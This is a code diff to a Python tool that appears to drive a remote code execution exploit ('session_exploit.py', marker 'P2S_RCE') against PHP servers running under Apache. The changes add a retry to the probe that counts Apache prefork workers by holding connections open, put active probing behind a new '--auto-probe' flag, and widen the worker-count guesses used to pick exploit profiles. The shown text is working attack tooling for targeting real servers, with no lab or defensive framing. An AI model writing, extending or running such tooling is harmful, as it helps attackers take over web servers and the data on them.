@@ -195,14 +195,17 @@ def probe_prefork_workers(url: str, *, insecure: bool = False,
         try:
             for _ in range(count):
                 hold_one()
-            time.sleep(2.0)
-            probe = HttpClient(url, timeout=probe_timeout,
-                               insecure=insecure, max_body=4096)
-            try:
-                probe.request("GET", follow=False)
-                return True
-            except (OSError, http.client.HTTPException, ValueError):
-                return False
+            time.sleep(3.0)
+            for attempt in range(2):
+                probe = HttpClient(url, timeout=probe_timeout,
+                                   insecure=insecure, max_body=4096)
+                try:
+                    probe.request("GET", follow=False)
+                    return True
+                except (OSError, http.client.HTTPException, ValueError):
+                    if attempt == 0:
+                        time.sleep(2.0)
+            return False
         except OSError:
             return False
         finally:
@@ -632,6 +635,9 @@ def auto_candidates(fp: dict[str, Any], args: argparse.Namespace,
                      fp.get("workers"))
     workers = ([int(known_workers)] if known_workers
                else [1, 2, 150])
+    detected = getattr(args, "auto_detected_workers", None)
+    if detected and detected not in (1, 150) and 150 not in workers:
+        workers.append(150)
     candidates: list[dict[str, Any]] = []
     seen: set[tuple[str, int]] = set()
     for arch in arches:
@@ -730,9 +736,10 @@ def main() -> int:
     ap.add_argument("--run", action="store_true",
                     help="run session_exploit.py with the selected profile")
     ap.add_argument("--auto", action="store_true",
-                    help="try unknown architecture and worker-count variants; "
-                         "with --run, actively probe the Apache prefork pool "
-                         "unless --workers/--production-workers is given")
+                    help="try unknown architecture and worker-count variants")
+    ap.add_argument("--auto-probe", action="store_true",
+                    help="with --auto, actively measure the Apache prefork pool "
+                         "instead of only trying 1, 2, and 150")
     ap.add_argument("--fallback", action="store_true",
                     help="try the priority profile queue when the exact build is unknown")
     ap.add_argument("--try-all", action="store_true",
@@ -747,6 +754,8 @@ def main() -> int:
     ap.add_argument("--response-marker", default="P2S_RCE",
                     help="marker used by production response proof")
     args = ap.parse_args()
+    if args.auto_probe and not args.auto:
+        ap.error("--auto-probe requires --auto")
 
     if args.list_profiles:
         for version in sorted(VERSION_OFFSETS, key=_ver_tuple):
@@ -816,8 +825,9 @@ def main() -> int:
         if fp["memory_probe"].get("limit_bytes"):
             fp["memory_limit"] = fp["memory_probe"]["limit_bytes"]
 
-    if (args.auto and args.run and not persistent and not args.profile and
-            args.workers is None and args.production_workers is None and
+    if (args.auto and args.auto_probe and args.run and not persistent and
+            not args.profile and args.workers is None and
+            args.production_workers is None and
             (fp.get("sapi") == "apache2handler" or
              (fp.get("sapi_hint") or "").lower() == "apache")):
         print("[*] auto: probing Apache prefork worker count", flush=True)
@@ -825,6 +835,7 @@ def main() -> int:
                                          probe_timeout=min(3.0, args.timeout))
         if detected:
             args.workers = detected
+            args.auto_detected_workers = detected
             fp["workers"] = detected
             print(f"[+] auto: detected workers={detected}", flush=True)
         else:
